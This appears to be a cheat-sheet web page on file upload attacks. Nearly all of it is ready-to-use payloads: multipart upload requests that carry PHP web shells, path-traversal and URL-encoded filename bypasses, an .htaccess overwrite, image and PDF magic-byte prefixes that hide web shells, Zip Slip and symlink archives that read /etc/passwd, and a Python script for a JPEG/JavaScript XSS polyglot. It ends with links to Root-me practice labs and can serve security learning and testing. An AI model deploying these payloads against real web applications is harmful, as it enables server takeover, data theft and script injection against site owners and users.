<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>File Upload Attack</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Press+Start+2P&display=swap');

    :root {
      --color-dark: #050A0E;
      --color-medium: #0D1B2A;
      --color-light: #1B263B;
      --color-neon-red: #FF073A;
      --color-text-light: #c0c7d6;
    }

    * {
      font-family: 'Fira Code', monospace;
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background-color: var(--color-dark);
      color: var(--color-text-light);
      min-height: 100vh;
      padding: 20px;
      position: relative;
      overflow-x: hidden;
    }

    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(rgba(255, 7, 58, 0.1), rgba(255, 7, 58, 0.05)), url('https://www.transparenttextures.com/patterns/3px-tile.png');
      z-index: -1;
      animation: moveBackground 5s linear infinite;
    }

    @keyframes moveBackground {
      from { background-position: 0 0; }
      to { background-position: 100px 100px; }
    }

    .content-wrapper {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 20px;
    }

    h1 {
      font-family: 'Press Start 2P', cursive;
      font-size: 24px;
      color: var(--color-neon-red);
      margin-bottom: 25px;
      animation: glitch 0.5s infinite alternate;
      text-align: center;
    }

    h2, h3 {
      color: var(--color-neon-red);
      margin: 20px 0;
      border-bottom: 2px solid var(--color-neon-red);
      padding-bottom: 10px;
      text-align: left;
    }

    p {
      margin: 15px 0;
      line-height: 1.6;
      text-align: justify;
    }

    pre, code {
      background: var(--color-medium);
      padding: 15px;
      border-radius: 5px;
      font-size: 14px;
      color: var(--color-neon-red);
      border: 2px solid var(--color-neon-red);
      margin: 15px 0;
      line-height: 1.5;
      white-space: pre-wrap;
      word-wrap: break-word;
      overflow: hidden;
    }

    strong {
      font-weight: bold;
      color: var(--color-neon-red);
    }

    ::-webkit-scrollbar {
      display: none;
    }

    pre {
      max-width: 100%;
    }

    code {
      display: block;
      padding: 1em;
    }

    .content-wrapper a {
      color: var(--color-neon-red);
      text-decoration: none;
    }

    .content-wrapper a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="content-wrapper">
<br>
<br>
  <h1>File Upload Attack</h1>
  <p>It is often used for gaining access to the target shell using Reverse Shell, or getting sensitive information using Remote Code Execution (RCE).</p>

  <h2>Change Upload Location by Filename</h2>
  <p>We might be able to upload our file to an unintended location by path traversing with the filename, e.g., <code>../example.php</code> or <code>..%2Fexample.php</code></p>
  <pre><code>------abcdefghijk
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
Content-Type: application/x-php

&lt;?php echo system($_GET['cmd']); ?&gt;

------abcdefghijk
</code></pre>
  <p>Do not forget to test bypass techniques as below:</p>
  <pre><code>%2E%2E%2Fexploit.php
%252E%252E%252Fexploit.php
..%252Fexploit.php
</code></pre>

  <h2>Overwrite Server Configuration</h2>
  <p>We might be able to overwrite the web server configuration file such as ".htaccess", ".htpasswd" by specifying the filename to the name of the config file and writing desired contents of that.</p>
  <pre><code>------abcdefghijk
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .abc

------abcdefghijk
</code></pre>

  <h2>Magic Bytes</h2>
  <p>If the website checks the magic byte of the uploaded file for allowing only image files to be uploaded, we might be able to bypass this validation by adding magic bytes before the actual payload.</p>
  <p>The <code>exif_imagetype()</code> PHP function is likely to be used for such validation.</p>
  <p>In addition, we may need to change other values such as "Content-Type" depending on the situation.</p>

  <h3>PNG</h3>
  <p>Hex Signature: <code>89 50 4E 47 0D 0A 1A 0A</code></p>
  <p>Payload example:</p>
  <pre><code>‰PNG
&lt;?php echo system($_GET['cmd']); ?&gt;
</code></pre>

  <h3>JPG/JPEG</h3>
  <p>Hex Signatures:</p>
  <ul>
    <li><code>FF D8 FF EE</code></li>
    <li><code>FF D8 FF E0</code></li>
    <li><code>FF D8 FF E0 00 10 4A 46 49 46 00 01</code></li>
  </ul>
  <p>Payload examples:</p>
  <pre><code>ÿØÿî
&lt;?php echo system($_GET['cmd']); ?&gt;

ÿØÿà
&lt;?php echo system($_GET['cmd']); ?&gt;

ÿØÿà␀␐JFIF␀␁
&lt;?php echo system($_GET['cmd']); ?&gt;
</code></pre>

  <h3>PDF</h3>
  <p>Hex Signature: <code>25 50 44 46 2D</code></p>
  <p>Payload example:</p>
  <pre><code>%PDF-
&lt;?php echo system($_GET['cmd']); ?&gt;
</code></pre>

  <h3>GIF</h3>
  <p>Hex Signatures:</p>
  <ul>
    <li><code>47 49 46 38 37 61</code> (GIF87a)</li>
    <li><code>47 49 46 38 39 61</code> (GIF89a)</li>
  </ul>
  <p>Payload examples:</p>
  <pre><code>GIF87a
&lt;?php echo system($_GET['cmd']); ?&gt;

GIF89a
&lt;?php echo system($_GET['cmd']); ?&gt;
</code></pre>

  <h3>RIFF WAVE</h3>
  <p>Hex Signature: <code>52 49 46 46 ?? ?? ?? ?? 57 41 56 45</code></p>
  <p>Payload example:</p>
  <pre><code>RIFF????WAVE
&lt;?php echo system($_GET['cmd']); ?&gt;
</code></pre>

  <h2>Combine Payload into Image File</h2>
  <p>The payload can be executed by combining it into image file data.</p>
  <p>For example, generate a blank image file at first:</p>
  <pre><code>convert -size 32x32 xc:white test.jpg
</code></pre>
  <p>And then we can put our payload at the end of the image data:</p>
  <pre><code>ÿØÿàJFIFHHÿÛC
$.' ",#(7),01444'9=82&lt;.342ÿÀ ÿÄÿÄÿÚ?
&lt;?php echo system("whoami");?&gt;
</code></pre>

  <h2>Zip</h2>
  <p>If the target website restricts uploads to zip files only, the website (server) may unzip uploaded files internally and display the result of the decompressed file somewhere, e.g., <code>/upload/example.txt</code></p>

  <h3>Zip Slip</h3>
  <p>Create a file containing '..' in the filename, and compress this file.</p>
  <pre><code>echo '&lt;?php echo system("id");?&gt;' > '../test.php'
zip test.zip '../test.php'
</code></pre>
  <p>After uploading the zip file, the target website (server) will decompress this file and may store the <code>test.php</code> file into an unexpected directory.</p>

  <h3>LFI with Symlinks</h3>
  <p>In the local machine, create a symbolic link for a sensitive file. Then compress the symlink with <code>zip</code></p>
  <pre><code>ln -s /etc/passwd passwd.txt
zip --symlink test.zip passwd.txt
</code></pre>
  <p>When we upload the zip file to the target website, the website decompresses the zip file and may display the file of the symbolic link <code>/etc/passwd</code>In short, we may be able to see the contents of the sensitive file.</p>

  <h2>JPEG Polyglot XSS</h2>
  <p>We may be able to inject XSS by inserting arbitrary JavaScript code into a JPEG file.</p>
  <p>We can generate automatically a polyglot JPEG with <code>imgjs_polygloter</code></p>
  <p>Below is the manual exploitation flow.</p>

  <h3>1. Prepare JPEG Image</h3>
  <p>Here we create a blank JPEG image using the <code>convert</code> command.</p>
  <pre><code>convert -size 100x100 xc:white evil.jpg
cp evil.jpg evil_original.jpg
</code></pre>

  <h3>2. Create XSS Payload in Hex</h3>
  <p>We will insert the following JavaScript code:</p>
  <pre><code>*/=alert("test");/*
</code></pre>
  <p>To insert it into the JPEG file, we need to convert this to HEX as below:</p>
  <pre><code>2A 2F 3D 61 6C 65 72 74 28 22 74 65 73 74 22 29 3B 2F 2A
</code></pre>

  <h3>3. Start Hex Editor</h3>
  <p>Start a hex editor to modify our <code>evil.jpg</code>We use <code>ghex</code> here but you can use your favorite HEX editor.</p>
  <pre><code>ghex evil.jpg
</code></pre>

  <h3>4. Insert Our JavaScript into JPEG File</h3>
  <p>Now start inserting our payload. First, we replace <code>00 10</code> after <code>FF D8 FF E0</code> with our <code>2F 2A (/*)</code></p>
  <pre><code>FF D8 FF E0 2F 2A 4A 46 49 46 00 01 01 01 00 48 00 ...
</code></pre>
  <p>By this, the length of the JPEG header is 12074 bytes (<code>0x2F2A</code> in decimal).</p>
  <p>Since the size of our payload is 19 bytes as below:</p>
  <pre><code>python3
&gt;&gt;&gt; payload = b'*/=alert("test");/*'
&gt;&gt;&gt; len(payload)
19
</code></pre>
  <p>We need to pad out the remaining 12042 bytes (12074 - 16 - 19) with nulls.</p>
  <p>Below is the Python code example to generate a polyglot JPEG file:</p>
  <pre><code>payload = b'*/=alert("test");/*'
    input_file = 'evil_original.jpg'
    output_file = 'evil.jpg'
    
    a = open(input_file, 'rb').read()
    
    # Get the length of the header
    header_size = int(a.hex()[8:12], 16)
    new_header_size = int(payload.hex()[2:4]+payload.hex()[:2], 16)
    
    # Calculate the size of nulls for padding
    null_size = new_header_size - header_size - 16
    
    # Get start and end
    start = a[:40]
    end = a.hex()[40:]
    end = bytearray([int(end[i:i+2], 16) for i in range(0, len(end), 2)])
    
    res = start + (null_size * b'\x00') + payload + end
    
    with open(output_file, 'wb') as f:
        f.write(res)
</code></pre>

<h2>5. XSS with this JPEG</h2>
<p>Inject XSS to make our JPEG to execute JavaScript code. We need to set charset to ISO-8859-1 for executing that.</p>
<pre><code>&lt;script charset="ISO-8859-1" src="evil.jpg"&gt;&lt;/script&gt;</code></pre>
<h2>Labs</h2>
<p>File upload Double extensions: <a href="https://www.root-me.org/fr/Challenges/Web-Serveur/File-upload-Double-extensions">Root-me</a></p>
<p>File upload Type MIME: <a href="https://www.root-me.org/fr/Challenges/Web-Serveur/File-upload-Type-MIME">Root-me</a></p>
<p>File upload Null byte: <a href="https://www.root-me.org/fr/Challenges/Web-Serveur/File-upload-Null-byte">Root-me</a></p>
<p>File upload ZIP: <a href="https://www.root-me.org/fr/Challenges/Web-Serveur/File-upload-ZIP">Root-me</a></p>
<p>File upload Polyglot: <a href="https://www.root-me.org/fr/Challenges/Web-Serveur/File-upload-Polyglot">Root-me</a></p>

